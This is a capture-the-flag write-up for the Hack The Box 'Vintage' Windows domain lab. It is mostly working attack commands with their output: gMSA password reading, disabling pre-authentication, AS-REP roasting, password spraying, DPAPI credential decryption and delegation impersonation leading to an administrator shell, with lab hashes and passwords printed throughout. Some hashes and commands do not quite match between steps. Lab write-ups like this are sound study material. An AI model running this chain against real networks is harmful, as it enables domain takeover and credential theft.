1,Recon
It is given that 
```
Machine Information

As is common in real life Windows pentests, you will start the Vintage box with credentials for the following account: P.Rosa / Rosaisbest123
```

port scan
```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-01-02 10:52:22Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: vintage.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vintage.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         Microsoft Windows RPC
57175/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-01-02T10:53:15
|_  start_date: N/A
|_clock-skew: -1s

```

There is an ldap server in 3268, as well as a Kerberos service and a 5985winrm service.
Let's use `ldapsearch` to find something useful here
```
ldapsearch -x -H ldap://10.10.11.45 -D "P.Rosa@vintage.htb" -w "Rosaisbest123" -b "DC=vintage,DC=htb" "(objectClass=user)" sAMAccountName memberOf


# extended LDIF
#
# LDAPv3
# base <DC=vintage,DC=htb> with scope subtree
# filter: (objectClass=user)
# requesting: sAMAccountName memberOf 
#
 
# Administrator, Users, vintage.htb
dn: CN=Administrator,CN=Users,DC=vintage,DC=htb
memberOf: CN=Group Policy Creator Owners,CN=Users,DC=vintage,DC=htb
memberOf: CN=Domain Admins,CN=Users,DC=vintage,DC=htb
memberOf: CN=Enterprise Admins,CN=Users,DC=vintage,DC=htb
memberOf: CN=Schema Admins,CN=Users,DC=vintage,DC=htb
memberOf: CN=Administrators,CN=Builtin,DC=vintage,DC=htb
sAMAccountName: Administrator
 
# Guest, Users, vintage.htb
dn: CN=Guest,CN=Users,DC=vintage,DC=htb
memberOf: CN=Guests,CN=Builtin,DC=vintage,DC=htb
sAMAccountName: Guest
 
# DC01, Domain Controllers, vintage.htb
dn: CN=DC01,OU=Domain Controllers,DC=vintage,DC=htb
sAMAccountName: DC01$
 
# krbtgt, Users, vintage.htb
dn: CN=krbtgt,CN=Users,DC=vintage,DC=htb
memberOf: CN=Denied RODC Password Replication Group,CN=Users,DC=vintage,DC=htb
sAMAccountName: krbtgt
 
# gMSA01, Managed Service Accounts, vintage.htb
dn: CN=gMSA01,CN=Managed Service Accounts,DC=vintage,DC=htb
sAMAccountName: gMSA01$
 
# fs01, Computers, vintage.htb
dn: CN=fs01,CN=Computers,DC=vintage,DC=htb
memberOf: CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=vintage,DC=htb
sAMAccountName: FS01$
 
# M.Rossi, Users, vintage.htb
dn: CN=M.Rossi,CN=Users,DC=vintage,DC=htb
sAMAccountName: M.Rossi
 
# R.Verdi, Users, vintage.htb
dn: CN=R.Verdi,CN=Users,DC=vintage,DC=htb
sAMAccountName: R.Verdi
 
# L.Bianchi, Users, vintage.htb
dn: CN=L.Bianchi,CN=Users,DC=vintage,DC=htb
memberOf: CN=ServiceManagers,OU=Pre-Migration,DC=vintage,DC=htb
memberOf: CN=Remote Management Users,CN=Builtin,DC=vintage,DC=htb
sAMAccountName: L.Bianchi
 
# G.Viola, Users, vintage.htb
dn: CN=G.Viola,CN=Users,DC=vintage,DC=htb
memberOf: CN=ServiceManagers,OU=Pre-Migration,DC=vintage,DC=htb
sAMAccountName: G.Viola
 
# C.Neri, Users, vintage.htb
dn: CN=C.Neri,CN=Users,DC=vintage,DC=htb
memberOf: CN=ServiceManagers,OU=Pre-Migration,DC=vintage,DC=htb
memberOf: CN=Remote Management Users,CN=Builtin,DC=vintage,DC=htb
sAMAccountName: C.Neri
 
# P.Rosa, Users, vintage.htb
dn: CN=P.Rosa,CN=Users,DC=vintage,DC=htb
sAMAccountName: P.Rosa
 
# svc_sql, Pre-Migration, vintage.htb
dn: CN=svc_sql,OU=Pre-Migration,DC=vintage,DC=htb
memberOf: CN=ServiceAccounts,OU=Pre-Migration,DC=vintage,DC=htb
sAMAccountName: svc_sql
 
# svc_ldap, Pre-Migration, vintage.htb
dn: CN=svc_ldap,OU=Pre-Migration,DC=vintage,DC=htb
memberOf: CN=ServiceAccounts,OU=Pre-Migration,DC=vintage,DC=htb
sAMAccountName: svc_ldap
 
# svc_ark, Pre-Migration, vintage.htb
dn: CN=svc_ark,OU=Pre-Migration,DC=vintage,DC=htb
memberOf: CN=ServiceAccounts,OU=Pre-Migration,DC=vintage,DC=htb
sAMAccountName: svc_ark
 
# C.Neri_adm, Users, vintage.htb
dn: CN=C.Neri_adm,CN=Users,DC=vintage,DC=htb
memberOf: CN=DelegatedAdmins,OU=Pre-Migration,DC=vintage,DC=htb
memberOf: CN=Remote Desktop Users,CN=Builtin,DC=vintage,DC=htb
sAMAccountName: C.Neri_adm
 
# L.Bianchi_adm, Users, vintage.htb
dn: CN=L.Bianchi_adm,CN=Users,DC=vintage,DC=htb
memberOf: CN=DelegatedAdmins,OU=Pre-Migration,DC=vintage,DC=htb
memberOf: CN=Domain Admins,CN=Users,DC=vintage,DC=htb
sAMAccountName: L.Bianchi_adm
 
# search reference
ref: ldap://ForestDnsZones.vintage.htb/DC=ForestDnsZones,DC=vintage,DC=htb
 
# search reference
ref: ldap://DomainDnsZones.vintage.htb/DC=DomainDnsZones,DC=vintage,DC=htb
 
# search reference
ref: ldap://vintage.htb/CN=Configuration,DC=vintage,DC=htb
 
# search result
search: 2
result: 0 Success
 
# numResponses: 21
# numEntries: 17
# numReferences: 3
```
Then we can find another domain `FS01.vintage.htb`

We can also use bloodhound to collect the information of this domain
![](images/Pasted%20image%2020250418234005.png)
It can be found that L.BIANCHI_ADM@VINTAGE.HTB is in the domain administrator group and has administrator privileges.
![](images/Pasted%20image%2020250418234045.png)
And GMSA01$@VINTAGE.HTB can add himself to the Administrators group
Intra-domain relations:
![](images/Pasted%20image%2020250418234116.png)
From FS01 to GMSA01, we can see that FS01 can read GMS's password

Then GMS can add itself to the administrator group
![](images/Pasted%20image%2020250418234158.png)

Then let's exploit it step by step
Firstly, use GetTGT.py: provide password, hash or aeskey to request TGT and save in ccache format
```
impacket-getTGT  -dc-ip 10.10.11.45 vintage.htb/FS01$:fs01
```
Set the environment variable KRB5CCNAME to FS01\$.ccache to specify the cache file that the Kerberos client should use
`export KRB5CCNAME=FS01\$.ccache`

Use bloodyAD to interact with Active Directory, through Kerberos authentication, to obtain the password of the managed service account named GMSA01$ (stored in the msDS-ManagedPassword attribute) from the specified Active Directory domain controller
```
bloodyAD --host dc01.vintage.htb -d "VINTAGE.HTB" --dc-ip 10.10.11.45 -k get object 'GMSA01$' --attr msDS-ManagedPassword


distinguishedName: CN=gMSA01,CN=Managed Service Accounts,DC=vintage,DC=htb
msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:b3a15bbdfb1c53238d4b50ea2c4d1178
msDS-ManagedPassword.B64ENCODED: cAPhluwn4ijHTUTo7liDUp19VWhIi9/YDwdTpCWVnKNzxHWm2Hl39sN8YUq3hoDfBcLp6S6QcJOnXZ426tWrk0ztluGpZlr3eWU9i6Uwgkaxkvb1ebvy6afUR+mRvtftwY1Vnr5IBKQyLT6ne3BEfEXR5P5iBy2z8brRd3lBHsDrKHNsM+Yd/OOlHS/e1gMiDkEKqZ4dyEakGx5TYviQxGH52ltp1KqT+Ls862fRRlEzwN03oCzkLYg24jvJW/2eK0aXceMgol7J4sFBY0/zAPwEJUg1PZsaqV43xWUrVl79xfcSbyeYKL0e8bKhdxNzdxPlsBcLbFmrdRdlKvE3WQ==

```

Attempt to obtain a Kerberos ticket from the Active Directory domain controller using a known GMSA account hash
```
# impacket-getTGT vintage.htb/GMSA01$ -hashes aad3b435b51404eeaad3b435b51404ee:a317f224b45046c1446372c4dc06ae53
 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
 
[*] Saving ticket in GMSA01$.ccache
 
└─#  export KRB5CCNAME=GMSA01\$.ccache
```

Then add P.Rosa to SERVICEMANAGERS, use GMSA's credentials, and then generate your own credentials
```
└─# bloodyAD --host dc01.vintage.htb -d "VINTAGE.HTB" --dc-ip 10.10.11.45 -k add groupMember "SERVICEMANAGERS" "P.Rosa"
[+] P.Rosa added to SERVICEMANAGERS
 
└─# impacket-getTGT vintage.htb/P.Rosa:Rosaisbest123 -dc-ip dc01.vintage.htb
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
 
[*] Saving ticket in P.Rosa.ccache
 
└─#  export KRB5CCNAME=P.Rosa.ccache 
```

Try to use this ticket to list users who do not need Kerberos domain authentication, first generate a username list of users in the domain
```
└─# ldapsearch -x -H ldap://10.10.11.45 -D "P.Rosa@vintage.htb" -w "Rosaisbest123" -b "DC=vintage,DC=htb" "(objectClass=user)" sAMAccountName | grep "sAMAccountName:" | cut -d " " -f 2 > usernames.txt   
 
└─# cat usernames.txt 
Administrator
Guest
DC01$
krbtgt
gMSA01$
FS01$
M.Rossi
R.Verdi
L.Bianchi
G.Viola
C.Neri
P.Rosa
svc_sql
svc_ldap
svc_ark
C.Neri_adm
L.Bianchi_adm
```

Then use impact-GetNPUsers to list users who do not require Kerberos realm authentication (UF_DONT_REQUIRE_PREAUTH)
```
└─# impacket-GetNPUsers -dc-ip 10.10.11.45 -request -usersfile usernames.txt vintage.htb/
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
 
/usr/share/doc/python3-impacket/examples/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User DC01$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User gMSA01$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User FS01$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User M.Rossi doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User R.Verdi doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User L.Bianchi doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User G.Viola doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User C.Neri doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User P.Rosa doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User svc_ldap doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User svc_ark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User C.Neri_adm doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User L.Bianchi_adm doesn't have UF_DONT_REQUIRE_PREAUTH set
```

Next disable pre-authentication
```
└─# bloodyAD --host dc01.vintage.htb -d "VINTAGE.HTB" --dc-ip 10.10.11.45 -k add uac SVC_ARK -f DONT_REQ_PREAUTH
[-] ['DONT_REQ_PREAUTH'] property flags added to SVC_ARK's userAccountControl
       
└─# bloodyAD --host dc01.vintage.htb -d "VINTAGE.HTB" --dc-ip 10.10.11.45 -k add uac SVC_LDAP -f DONT_REQ_PREAUTH  
[-] ['DONT_REQ_PREAUTH'] property flags added to SVC_LDAP's userAccountControl
 
└─#  bloodyAD --host dc01.vintage.htb -d "VINTAGE.HTB" --dc-ip 10.10.11.45 -k add uac SVC_SQL -f DONT_REQ_PREAUTH 
[-] ['DONT_REQ_PREAUTH'] property flags added to SVC_SQL's userAccountControl                                                                                                                           
```

Enable Account
```
└─# bloodyAD --host dc01.vintage.htb -d "VINTAGE.HTB" --dc-ip 10.10.11.45 -k remove uac SVC_ARK -f ACCOUNTDISABLE
[-] ['ACCOUNTDISABLE'] property flags removed from SVC_ARK's userAccountControl
 
└─#  bloodyAD --host dc01.vintage.htb -d "VINTAGE.HTB" --dc-ip 10.10.11.45 -k remove uac SVC_LDAP -f ACCOUNTDISABLE
[-] ['ACCOUNTDISABLE'] property flags removed from SVC_LDAP's userAccountControl
 
└─# bloodyAD --host dc01.vintage.htb -d "VINTAGE.HTB" --dc-ip 10.10.11.45 -k remove uac SVC_SQL -f ACCOUNTDISABLE
 
[-] ['ACCOUNTDISABLE'] property flags removed from SVC_SQL's userAccountControl
```

Check the domain user again
```
└─# impacket-GetNPUsers -dc-ip 10.10.11.45 -request -usersfile usernames.txt vintage.htb/
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
 
/usr/share/doc/python3-impacket/examples/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User DC01$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User gMSA01$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User FS01$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User M.Rossi doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User R.Verdi doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User L.Bianchi doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User G.Viola doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User C.Neri doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User P.Rosa doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc_sql@VINTAGE.HTB:193416fc53443c06de46d37da3d42166$b35ce4ea605d525055533543a7e9dd10fffc3a65ffc2f33c6961f648c340910cd492095e921ae4acaa30dc45f394e315d8b55ed1a832138d4061fec01cda3a05efe7ff9add64991b10354de2b29e108c905f72a1332a0e3a1d56b3d2023535f6e7bc9ef8435bdbc7152d45ab59e5c69415cc2aea0ffd880746bacda9f29e4d0c394217941623fc8b208aea33d3c3af1c362643c0e502505559d9bd997603673d1e80554ad5483730c8cfd62d4dbcce434cefa88411e7b9902b54c9bc0ec9cf8c9f5da98851eaa44236812e34064a956e45c4a4a911efb16beb6c0bb040a29465468f4a33df5957dd0cb8
$krb5asrep$23$svc_ldap@VINTAGE.HTB:2e8eb8a54f2e38ceb86cb167ebcfd3a3$4009fa7585adf1b1ce1e62ea59ef0e1db4569403621261a531e062559d9d62eef6bf55b181f10661ddb6de9030ff78d1dcd91a0920ff7c885fb2d85e1e8a2b2bd9894de70f8f6ef413254c150398269766b930f789c8a883b4a45326235480e46fee1db81736e4e1ce86f261a6ea2ddd7c3a6646e59a67b9bf4ff771ccfecc2354df616afedc768a022234517b88b95184b9fbdd90eb43b52ef883720b83be869de267f99ce70da020a4899900c454f3be18a0b85b2c1248a159219c34e85c888edb8f2a09af6d9c4a4d14766d0f248cfbc0a57cdace833cd589aa550de0f9e35ded67ad616ed0adbdbb
$krb5asrep$23$svc_ark@VINTAGE.HTB:ab991bf5f1ab56057d523c8b04f54993$6d178e1becf696f67f3b6c15f1d67a05570282f82e529a20b932253e72a3a62fd3c6662441c08154a9bd798a3079eb12b4cc104853611229183656c0254292f5b37be0d5a868b0a1b5b4940d40a3be5a1c402e44740b4fa42cd839cde7541268504c924d71b6dd3e6fe72400427d12bd7852cd6e61270b97d006224c5e0732406a6f7598a200e2acbd1d8f4c1ca47c028ab53ddd2d4de9efb98bfb49c2d962fe20bf98fef71d65c48ab252a288f53fac475cce8ddd1e30820a1df9dc058c877ae1e6e1bdcfe3954cbec461dcc085497914c8eb6d910010d4690377bbfedc160b604a1e4132a4e00de923
[-] User C.Neri_adm doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User L.Bianchi_adm doesn't have UF_DONT_REQUIRE_PREAUTH set                                                   
```

Try brute-forcing with hashcat
```
└─# hashcat -a 3 -m 18200 hash.txt /usr/share/wordlists/rockyou.txt --show
$krb5asrep$23$svc_sql@VINTAGE.HTB:21f3bee616690890b5888e3e18d56582$89e966c8c984fdba49c4a5cb373407959a53c78fe823bcb599e4bff22df326780d2a869ed1572467797244c4b2f50a49af143612ee467dba34784a66a5805ad1d556e129838c3107a40259d80edafb2e6f88c80a77a4b3d30d5069a69d3a6b7f001f2fa3251faa17706a7fd255a96c3bfadf10f93e049b0fcc1f41227af5dbefee1ae906f23bfc4d1c6b0f7a8f4328ecce63b45e6944157f88d814830c568fb59763f1d6e785736d5ec368c6d27968c399eaa339067dc32783df85920ae876d3241bace19475691d6373cd0700771659a90d15a4cfeeb1dd89a5a6659b2c6316863e475ce228ac83274f:Zer0the0ne
```

Then we finally get the credit `SVC_SQL:Zer0the0ne`

Use kerbrute to brute force the user
```
└─# ./kerbrute --dc vintage.htb -d vintage.htb -v passwordspray usernames.txt Zer0the0ne
 
    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
 
Version: v1.0.3 (9dad6e1) - 12/04/24 - Ronnie Flathers @ropnop
 
2024/12/04 09:36:16 >  Using KDC(s):
2024/12/04 09:36:16 >   vintage.htb:88
 
2024/12/04 09:36:16 >  [!] krbtgt@vintage.htb:Zer0the0ne - USER LOCKED OUT
2024/12/04 09:36:17 >  [!] Guest@vintage.htb:Zer0the0ne - USER LOCKED OUT
2024/12/04 09:36:17 >  [!] gMSA01$@vintage.htb:Zer0the0ne - Invalid password
2024/12/04 09:36:17 >  [!] FS01$@vintage.htb:Zer0the0ne - Invalid password
2024/12/04 09:36:17 >  [!] M.Rossi@vintage.htb:Zer0the0ne - Invalid password
2024/12/04 09:36:17 >  [!] L.Bianchi@vintage.htb:Zer0the0ne - Invalid password
2024/12/04 09:36:17 >  [!] R.Verdi@vintage.htb:Zer0the0ne - Invalid password
2024/12/04 09:36:17 >  [!] DC01$@vintage.htb:Zer0the0ne - Invalid password
2024/12/04 09:36:17 >  [!] G.Viola@vintage.htb:Zer0the0ne - Invalid password
2024/12/04 09:36:17 >  [!] Administrator@vintage.htb:Zer0the0ne - Invalid password
2024/12/04 09:36:17 >  [!] svc_sql@vintage.htb:Zer0the0ne - USER LOCKED OUT
2024/12/04 09:36:17 >  [!] P.Rosa@vintage.htb:Zer0the0ne - Invalid password
2024/12/04 09:36:17 >  [!] svc_ark@vintage.htb:Zer0the0ne - Invalid password
2024/12/04 09:36:17 >  [!] L.Bianchi_adm@vintage.htb:Zer0the0ne - Invalid password
2024/12/04 09:36:17 >  [!] svc_ldap@vintage.htb:Zer0the0ne - Invalid password
2024/12/04 09:36:17 >  [!] C.Neri_adm@vintage.htb:Zer0the0ne - Invalid password
2024/12/04 09:36:17 >  [+] VALID LOGIN:  C.Neri@vintage.htb:Zer0the0ne
2024/12/04 09:36:17 >  Done! Tested 17 logins (1 successes) in 0.481 seconds
```

Account C.Neri@vintage.htb successfully logged in with password `Zer0the0ne`
![](images/Pasted%20image%2020250418235650.png)

Get the credentials for this account
```
└─# impacket-getTGT vintage.htb/c.neri:Zer0the0ne -dc-ip vintage.htb 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
 
[*] Saving ticket in c.neri.ccache
 
└─# export KRB5CCNAME=c.neri.ccache
```

Then we can use evil-winrm to get the user shell.

By checking this account
```
Evil-WinRM* PS C:\Users\C.Neri> whoami /user

USER INFORMATION
----------------

User Name      SID
============== ==============================================
vintage\c.neri S-1-5-21-4024337825-2033394866-2055507597-1115
*Evil-WinRM* PS C:\Users\C.Neri> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```
I found something interesting here `DPAPI（Data Protection API）`

Here we use DPAPI to obtain Windows identity credentials
```
*Evil-WinRM* PS C:\Users\C.Neri\AppData\Roaming\Microsoft\Credentials> dir -h
 
 
    Directory: C:\Users\C.Neri\AppData\Roaming\Microsoft\Credentials

 
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-          6/7/2024   5:08 PM            430 C4BB96844A5C9DD45D5B6A9859252BA6
 
*Evil-WinRM* PS C:\Users\C.Neri\AppData\Roaming\Microsoft\Credentials>download C4BB96844A5C9DD45D5B6A9859252BA6

*Evil-WinRM* PS C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115> dir -h
 
 
    Directory: C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115
 
 
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-         12/4/2024   2:46 AM            740 1fe00192-86ec-4689-a4f2-f8c2336edaf4
-a-hs-          6/7/2024   1:17 PM            740 4dbf04d8-529b-4b4c-b4ae-8e875e4fe847
-a-hs-          6/7/2024   1:17 PM            740 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b
-a-hs-          6/7/2024   1:17 PM            904 BK-VINTAGE
-a-hs-         12/4/2024   2:46 AM             24 Preferred
 
*Evil-WinRM* PS C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115> download 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b
```
Then enter the decryption
```
└─# impacket-dpapi masterkey -file 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b -sid S-1-5-21-4024337825-2033394866-2055507597-1115 -password Zer0the0ne
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
 
[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b
Flags       :        0 (0)
Policy      :        0 (0)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)
 
Decrypted key with User Key (MD4 protected)
Decrypted key: 0xf8901b2125dd10209da9f66562df2e68e89a48cd0278b48a37f510df01418e68b283c61707f3935662443d81c0d352f1bc8055523bf65b2d763191ecd44e525a
 
└─# impacket-dpapi credential -file C4BB96844A5C9DD45D5B6A9859252BA6 -key 0xf8901b2125dd10209da9f66562df2e68e89a48cd0278b48a37f510df01418e68b283c61707f3935662443d81c0d352f1bc8055523bf65b2d763191ecd44e525a
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
 
[CREDENTIAL]
LastWritten : 2024-06-07 15:08:23
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000001 (CRED_TYPE_GENERIC)
Target      : LegacyGeneric:target=admin_acc
Description : 
Unknown     : 
Username    : vintage\c.neri_adm
Unknown     : Uncr4ck4bl3P4ssW0rd0312
```

The password of `c.neri_adm` is: `Uncr4ck4bl3P4ssW0rd0312`
![](images/Pasted%20image%2020250419000533.png)
![](images/Pasted%20image%2020250419000537.png)

The next step is to add C.NERL_ADM to DELEGATEDADMINS
```
└─# bloodyAD --host dc01.vintage.htb --dc-ip 10.10.11.45 -d "VINTAGE.HTB" -u c.neri_adm -p 'Uncr4ck4bl3P4ssW0rd0312' -k add groupMember "DELEGATEDADMINS" "SVC_SQL"  
[+] SVC_SQL added to DELEGATEDADMINS

bloodyAD --host dc01.vintage.htb -d "VINTAGE.HTB" --dc-ip 10.10.11.45 -k remove uac SVC_SQL -f ACCOUNTDISABLE 

└─#  bloodyAD --host dc01.vintage.htb -d "VINTAGE.HTB" --dc-ip 10.10.11.45 -k set object "SVC_SQL" servicePrincipalName  -v "cifs/fake" 
[+] SVC_SQL's servicePrincipalName has been updated
```

Get a ticket for this SVC
```
└─#  impacket-getTGT vintage.htb/svc_sql:Zer0the0ne -dc-ip dc01.vintage.htb
 
└─# export KRB5CCNAME=svc_sql.ccache
```

Impersonate L.BIANCHI_ADM user to request a service ticket for the cifs/dc01.vintage.htb service. After successfully obtaining the ticket, you can use it to access the service
```
└─# impacket-getST -spn 'cifs/dc01.vintage.htb' -impersonate L.Bianchi_adm -dc-ip 10.10.11.45 -k 'vintage.htb/svc_sql:Zer0the0ne'  
 
└─# export KRB5CCNAME=L.BIANCHI_ADM@cifs_dc01.vintage.htb@VINTAGE.HTB.ccache
```

Then we  can use this ticket to get the Administrator shell
```
└─# impacket-wmiexec -k -no-pass VINTAGE.HTB/L.BIANCHI_ADM@dc01.vintage.htb 
Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 
[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\> whoami
vintage\l.bianchi_adm
C:\> type Users\Administrator\Desktop\root.txt
```